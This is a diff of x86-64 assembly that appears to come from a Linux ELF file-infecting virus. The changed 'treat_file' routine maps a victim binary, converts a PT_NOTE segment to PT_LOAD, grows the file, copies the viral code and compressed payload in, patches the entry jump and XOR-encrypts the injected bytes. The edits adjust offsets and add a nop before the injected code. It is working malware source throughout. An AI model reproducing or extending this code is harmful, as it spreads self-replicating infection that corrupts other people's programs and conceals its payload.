@@ -760,7 +760,7 @@ treat_file:
 	mov rax, SYS_MMAP				; _ret = mmap(
 	xor rdi, rdi					; 	0,
 	mov rsi, [filesize]				; 	filesize
-	add rsi, infection_routine - begin		;	  + (infection_routine - begin)
+	add rsi, infection_routine - _start		;	  + (infection_routine - _start)
 	add rsi, [compressed_data_size]			;	  + compressed_data_size
 	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
 	mov r10, MAP_PRIVATE | MAP_ANONYMOUS		; 	MAP_PRIVATE | MAP_ANONYMOUS,
@@ -807,13 +807,13 @@ treat_file:
 	add rax, rdi					; _injected_segment_start += _offset_from_page;
 	mov [new_vaddr], rax				; new_vaddr = _new_vaddr;
 
-	mov rdi, _end - begin				; payload_size = _end - begin;
+	mov rdi, _end - _start				; payload_size = _end - _start;
 	mov [payload_size], rdi				; ...
 
 	mov rdi, [mappedfile]				; ret = convert_pt_note_to_load(mappedfile,
 	mov rsi, [payload_offset]			; payload_offset,
 	mov rdx, [new_vaddr]				; next_vaddr,
-	mov rcx, infection_routine - begin		; (infection_routine - begin)
+	mov rcx, infection_routine - _start		; (infection_routine - _start)
 	add rcx, [compressed_data_size]			;   + compressed_data_size
 	mov r8, [payload_size]				; payload_size,
 	call convert_pt_note_to_load			; );
@@ -823,7 +823,7 @@ treat_file:
 	mov rax, SYS_FTRUNCATE				; _ret = ftruncate(
 	mov rdi, [fd]					; fd,
 	mov rsi, [filesize]				; filesize
-	add rsi, infection_routine - begin		; + (infection_routine - begin)
+	add rsi, infection_routine - _start		; + (infection_routine - _start)
 	add rsi, [compressed_data_size]			; + compressed_data_size
 	syscall						; );
 	cmp rax, 0					; if (_ret < 0)
@@ -843,7 +843,7 @@ treat_file:
 							;	_addr,
 	mov rsi, [filesize]				; 	filesize
 	sub rsi, [offset_to_sub_mmap]			;	  - offset_to_sub_mmap,
-	add rsi, infection_routine - begin		;	  + (infection_routine - begin)
+	add rsi, infection_routine - _start		;	  + (infection_routine - _start)
 	add rsi, [compressed_data_size]			;	  + compressed_data_size
 	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
 	mov r10, MAP_SHARED | MAP_FIXED			; 	MAP_SHARED | MAP_FIXED,
@@ -853,10 +853,14 @@ treat_file:
 	cmp rax, MMAP_ERRORS				; if (_ret == MMAP_ERRORS)
 	je .unmap_file					; 	goto .unmap_file
 
-	; TODO Add a noop again to avoid lldb issues with infected
+	mov rdi, [mappedfile]				; _dest = file_map;
+	add rdi, [filesize]				; _dest += filesize;
+	mov byte [rdi], 0x90				; *_dest = 0x90; //nop instruction
+
 	; copy all bytes between begin and infection_routine to the segment
-	mov rdi, [mappedfile]				; _dest = file_map + filesize;
+	mov rdi, [mappedfile]				; _dest = file_map + filesize + 1;
 	add rdi, [filesize]				; ...
+	inc rdi						; ...
 	lea rsi, [rel begin]				; _src = begin;
 	mov rcx, infection_routine - begin		; _len = infection_routine - begin;
 	rep movsb					; memcpy(_dest, _src, _len);
@@ -864,7 +868,7 @@ treat_file:
 	; copy all compressed bytes between infection_routine and _end to the segment
 	mov rdi, [mappedfile]				; _dest = file_map
 	add rdi, [filesize]				; 	+ filesize
-	add rdi, infection_routine - begin		; 	+ (infection_routine - begin);
+	add rdi, infection_routine - _start		; 	+ (infection_routine - _start);
 	mov rsi, [compressed_data_ptr]			; _src = compressed_data_ptr;
 	mov rcx, [compressed_data_size]			; _len = compressed_data_size;
 	rep movsb					; memcpy(_dest, _src, _len);
@@ -875,20 +879,20 @@ treat_file:
 	mov eax, [rdi]					; ...
 
 	sub eax, [new_vaddr]				; _jmp_value -= new_vaddr;
-	sub eax, jmp_instr - begin			; _jmp_value -= jmp_instr - begin;
+	sub eax, jmp_instr - _start			; _jmp_value -= jmp_instr - _start;
 	sub eax, 5					; _jmp_value -= 5; // Size of jmp instruction
 
 	; change jmp_value in injected code
 	mov rdi, [mappedfile]				; _jmp_value_ptr = file_map
 	add rdi, [filesize]				; 	+ filesize
-	add rdi, jmp_instr - begin			; 	+ (jmp_instr - begin)
+	add rdi, jmp_instr - _start			; 	+ (jmp_instr - _start)
 	inc rdi						; 	+ 1;
 	mov [rdi], eax					; *_jmp_value_ptr = _jmp_value;
 
 	; change compressed_data_size2 in injected code
 	mov rdi, [mappedfile]				; _compressed_data_size2_ptr = file_map
 	add rdi, [filesize]				; 	+ filesize
-	add rdi, compressed_data_size2 - begin		; 	+ (compressed_data_size2 - begin)
+	add rdi, compressed_data_size2 - _start		; 	+ (compressed_data_size2 - _start)
 	mov rax, [compressed_data_size]			; *_compressed_data_size2_ptr = compressed_data_size;
 	mov [rdi], rax					; ...
 
@@ -898,9 +902,9 @@ treat_file:
 	mov [rdi], rax					; ...
 
 	; xor cipher all injected bytes between infection_routine and _end
-	mov rdi, [mappedfile]				; data = file_map + filesize + (infection_routine - begin);
+	mov rdi, [mappedfile]				; data = file_map + filesize + (infection_routine - _start);
 	add rdi, [filesize]				;
-	add rdi, infection_routine - begin		;
+	add rdi, infection_routine - _start		;
 	mov rsi, [compressed_data_size]			; size = compressed_data_size
 	lea rdx, [rel key]				; key = key
 	mov rcx, key_size				; key_size = key_size
